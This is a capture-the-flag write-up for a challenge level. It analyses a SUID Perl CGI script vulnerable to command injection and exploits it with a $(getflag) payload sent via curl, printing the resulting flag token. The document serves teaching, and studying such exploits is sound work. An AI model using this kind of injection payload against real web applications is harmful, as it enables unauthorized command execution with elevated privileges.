# Level04 - Web Command Injection Exploit
## Challenge Overview
Level04 presents us with a Perl script (level04.pl) that:

- Has SUID (Set User ID) permissions set to flag04
- Functions as a simple web server script
- Is vulnerable to command injection

## File Analysis
### Permissions
```bash
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
```
### Key observations:

- The s in the permissions indicates SUID bit is set
- The script runs with flag04 privileges when executed
- It's owned by flag04 but executable by level04 users

## Script Content Analysis
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
### Understanding the Script
The script:

- Is a web application: Running on localhost:4747 (based on the comment)
- Uses CGI: CGI (Common Gateway Interface) is a protocol for web servers to execute scripts
- Takes user input: Uses param("x") to get a parameter named "x" from HTTP requests
- Executes shell commands: The backticks (`) in Perl execute shell commands
- Has no input validation: Takes user input and directly passes it to a shell command

### Vulnerability Explanation
The vulnerability is a classic command injection:

- The script takes a user parameter ("x")
- Passes that parameter directly to a shell command (echo $y 2>&1)
- Without any sanitization or validation
- And runs this command with elevated flag04 privileges

## Exploitation Steps

### 1. Identify the web service
The comment # localhost:4747 indicates the script runs as a web server on port 4747.

### 2. Craft a command injection payload
Since the script runs shell commands with user input, we can use shell syntax to inject our own commands:
```bash
$(getflag)
```

This will make the script execute:
```bash
echo $(getflag) 2>&1
```

The $() syntax tells the shell to execute getflag and substitute its output.

### 3. Send the exploit request
Using curl to send the HTTP request with our payload:
```bash
curl "http://localhost:4747/level04.pl?x=\$(getflag)"
```

### 4. Result
```plaintext
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

## Why This Works

- The script runs as a web server listening on port 4747
- It takes the "x" parameter and passes it to a shell command
- When we inject $(getflag), the shell executes getflag
- Because the script has SUID permissions, getflag runs with flag04 privileges
- The output of getflag is returned in the HTTP response

## Security Lessons

- **Input Validation**: Never trust user input; always validate and sanitize it
- **Command Injection**: Avoid passing user input directly to shell commands
- **SUID Scripts**: Perl (and other script) interpreters often ignore SUID bits for security reasons, but in this case, the command injection still runs with elevated privileges
- **Web Security**: Web applications require special attention to security as they're directly accessible to users

## Complete Solution

```bash
# Connect to the web server and inject the getflag command
curl "http://localhost:4747/level04.pl?x=\$(getflag)"

# Expected output: Check flag.Here is your token: ne2searoevaevoem4ov4ar8ap
```
